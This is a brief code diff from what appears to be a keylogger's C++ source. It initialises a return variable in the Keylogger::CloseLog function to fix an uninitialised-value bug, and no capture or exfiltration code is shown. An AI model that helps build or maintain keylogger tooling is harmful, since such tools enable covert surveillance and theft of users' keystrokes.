@@ -112,7 +112,7 @@ bool Keylogger::WriteLog(WCHAR* text)
 
 bool Keylogger::CloseLog()
 {
-	bool ret;
+	bool ret = false;
 	if (hLog)
 	{
 		ret = CloseHandle(hLog);
